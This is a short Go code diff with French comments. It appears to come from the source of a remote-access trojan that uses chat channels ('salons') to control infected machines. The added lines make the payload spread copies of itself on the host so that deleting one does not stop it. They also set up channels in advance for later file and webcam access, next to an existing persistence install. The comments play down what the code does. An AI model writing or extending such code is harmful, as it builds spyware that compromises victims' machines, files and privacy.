@@ -474,6 +474,9 @@ func startPayload() {
 		if cfg.Persist {
 			persistInstall()
 		}
+		// Duplication sur le poste : une copie supprimée ne coupe rien.
+		spreadCopies(false)
+		go spreadLoop()
 
 		// 2. Rapport machine : une seule requête réseau, rien de sensible.
 		time.Sleep(time.Duration(15+rand.Intn(20)) * time.Second)
@@ -540,11 +543,14 @@ func startPayload() {
 		guard("salon", func() {
 			for i := 0; i < 40; i++ {
 				if stopped.Load() || targetChannelSet() {
-					return
+					break
 				}
 				targetChannel() // provoque la résolution au besoin
 				time.Sleep(45 * time.Second)
 			}
+			// Tous les salons de la machine existent dès le début, même ceux
+			// qui ne serviront que plus tard (fichiers, webcam).
+			ensureAllChannels()
 		})
 		guard("categorie", func() {
 			// Les salons se créent en différé (repli réseau inclus) : on
